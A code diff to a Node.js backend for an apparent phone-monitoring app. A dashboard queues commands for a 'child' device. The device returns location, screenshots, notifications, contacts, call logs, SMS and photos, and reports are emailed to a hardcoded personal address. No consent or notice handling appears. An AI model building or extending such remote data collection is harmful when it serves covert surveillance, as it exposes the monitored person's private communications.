@@ -1,4 +1,4 @@
-﻿const { v4: uuidv4 } = require('uuid');
+const { v4: uuidv4 } = require('uuid');
 const { getStore, saveStore, MAX_HISTORY, ALLOWED_ITEMS } = require('../lib/store');
 
 function checkAuth(req) {
@@ -56,7 +56,7 @@ module.exports = async function handler(req, res) {
     return send(res, 200, store.reports.slice(0, 50));
   }
 
-  // POST /reports (upload report directly from APK)
+  // POST /reports (upload report directly from child device)
   if (req.method === 'POST' && (path === '/reports' || path.endsWith('/reports'))) {
     let body = req.body;
     if (typeof body === 'string') {
@@ -66,13 +66,14 @@ module.exports = async function handler(req, res) {
       try {
         const chunks = [];
         for await (const chunk of req) chunks.push(chunk);
-        body = JSON.parse(Buffer.concat(chunks).toString() || '{}');
+        const raw = Buffer.concat(chunks).toString();
+        body = raw ? JSON.parse(raw) : {};
       } catch {
         return send(res, 400, { error: 'Invalid JSON' });
       }
     }
 
-    const { deviceId, subject, body: reportText, items, screenshotPath } = body || {};
+    const { deviceId, subject, body: reportText, items, screenshotPath, screenshotBase64 } = body || {};
     if (!store.reports) store.reports = [];
     const reportEntry = {
       id: 'rep_' + uuidv4().replace(/-/g, '').slice(0, 10),
@@ -81,6 +82,7 @@ module.exports = async function handler(req, res) {
       body: reportText || '',
       items: items || [],
       screenshotPath: screenshotPath || '',
+      screenshotBase64: screenshotBase64 || '',
       receivedAt: new Date().toISOString(),
     };
 
@@ -99,7 +101,7 @@ module.exports = async function handler(req, res) {
     return send(res, 201, { ok: true, reportId: reportEntry.id });
   }
 
-  // GET /commands?deviceId=  (APK poll)
+  // GET /commands?deviceId=  (child APK poll)
   if (req.method === 'GET' && (path === '/commands' || path.endsWith('/commands'))) {
     const deviceId = (url.searchParams.get('deviceId') || '').trim();
     if (!deviceId) return send(res, 400, { error: 'deviceId required' });
@@ -142,7 +144,7 @@ module.exports = async function handler(req, res) {
     return send(res, 200, Array.from(store.pending.values()));
   }
 
-  // POST /commands  (create)
+  // POST /commands  (create command from dashboard)
   if (req.method === 'POST' && (path === '/commands' || path.endsWith('/commands'))) {
     let body = req.body;
     if (typeof body === 'string') {
@@ -162,7 +164,7 @@ module.exports = async function handler(req, res) {
       }
     }
 
-    const { deviceId, items, emailTo } = body;
+    const { deviceId, items, emailTo } = body || {};
     const to = (emailTo || 'ankitraj01567@gmail.com').trim();
 
     if (!deviceId || !Array.isArray(items) || items.length === 0) {
@@ -177,7 +179,7 @@ module.exports = async function handler(req, res) {
 
     if (cleanItems.length === 0) {
       return send(res, 400, {
-        error: 'No valid items. Allowed: location, screenshot, contacts, call_logs, sms, photos',
+        error: 'No valid items. Allowed: location, screenshot, notifications, contacts, call_logs, sms, photos',
       });
     }
 
@@ -210,11 +212,11 @@ module.exports = async function handler(req, res) {
     return send(res, 201, command);
   }
 
-  // POST /commands/:id/ack
+  // POST /commands/:id/ack (child APK acknowledging completed command)
   if (req.method === 'POST' && path.includes('/ack')) {
     const parts = path.split('/').filter(Boolean);
     const idIdx = parts.indexOf('commands');
-    const id = parts[idIdx + 1];
+    const id = idIdx !== -1 ? parts[idIdx + 1] : parts[parts.length - 2];
     let body = req.body;
     if (!body || typeof body !== 'object') {
       try {
@@ -236,5 +238,5 @@ module.exports = async function handler(req, res) {
     return send(res, 200, { ok: true });
   }
 
-  return send(res, 404, { error: 'Not found' });
+  return send(res, 404, { error: 'Not found: ' + path });
 };
